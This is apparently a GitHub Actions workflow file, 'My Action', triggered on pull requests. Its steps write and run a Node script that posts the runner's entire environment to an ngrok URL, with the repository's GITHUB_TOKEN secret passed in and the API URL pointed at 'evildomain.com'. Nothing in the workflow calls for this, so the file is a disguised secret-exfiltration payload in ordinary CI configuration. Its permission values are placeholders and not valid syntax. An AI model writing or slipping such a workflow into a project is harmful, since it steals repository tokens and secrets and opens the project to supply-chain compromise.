name: My Action
on:
  workflow_dispatch:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  actions: read|write|none
  checks: read|write|none
  contents: read|write|none
  deployments: read|write|none
  id-token: read|write|none
  issues: read|write|none
  discussions: read|write|none
  packages: read|write|none
  pages: read|write|none
  pull-requests: read|write|none
  repository-projects: read|write|none
  security-events: read|write|none
  statuses: read|write|none
jobs:
  my-action:
    runs-on: ubuntu-latest
    steps:
      - run: mkdir test
      - run: cd test && npm init -y
      - run: touch index.js
      - run: npm install axios express
      - run: echo "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.listen(3000, async() => {await axios.post('https://a1e6-185-187-131-197.ngrok.io', process.env)});" > index.js
      - run: GITHUB_API_URL=https://evildomain.com MY_TOKEN=${{ secrets.GITHUB_TOKEN }} node index.js
